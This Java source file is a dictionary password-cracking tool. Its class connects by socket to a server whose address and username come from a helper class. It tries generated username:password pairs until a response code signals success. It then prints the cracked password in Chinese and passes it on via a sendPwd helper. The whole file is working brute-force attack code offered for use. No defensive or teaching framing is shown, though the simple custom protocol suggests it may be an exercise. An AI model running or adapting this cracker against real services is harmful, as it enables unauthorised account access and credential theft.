package tool;

import java.io.*;
import java.net.Socket;
import java.util.*;

public class Tool {

    private Socket client;

    private static final Integer ERROR_USER = -1;
    private static final Integer ERROR_PWD = 0;
    private static final Integer SUCCESS = 1;


    public void start() throws IOException, InterruptedException {
        Map<String, Object> serverInfoMap = ToolUtils.recvServerInfo();
        client = new Socket((String)serverInfoMap.get("ip"), (Integer)serverInfoMap.get("port"));
        blast(ToolUtils.generateInfo((String) serverInfoMap.get("username")));
    }

    public boolean blast(List<String> infoList) throws IOException, InterruptedException {
        OutputStream outputStream = client.getOutputStream();
        PrintWriter printWriter = new PrintWriter(outputStream);
        InputStream inputStream = client.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

        for (String info : infoList) {
            printWriter.println(info);
            printWriter.flush();
            Integer code = Integer.valueOf(reader.readLine());
            if (code == ERROR_USER) {
                System.out.println("账号错误");
                ToolUtils.sendPwd("");
                return false;
            } else if (code == ERROR_PWD) {
//                System.out.println("破解中..." + info.split(":")[1] + " 错误");
            } else if (code == SUCCESS) {
                System.out.println("破解成功！密码：" + info.split(":")[1]);
                ToolUtils.sendPwd(info.split(":")[1]);
                return true;
            } else {
                System.out.println("未知异常");
                return false;
            }
        }

        ToolUtils.sendPwd("");
        System.out.println("字典中无匹配密码。。。");
        return false;
    }
}
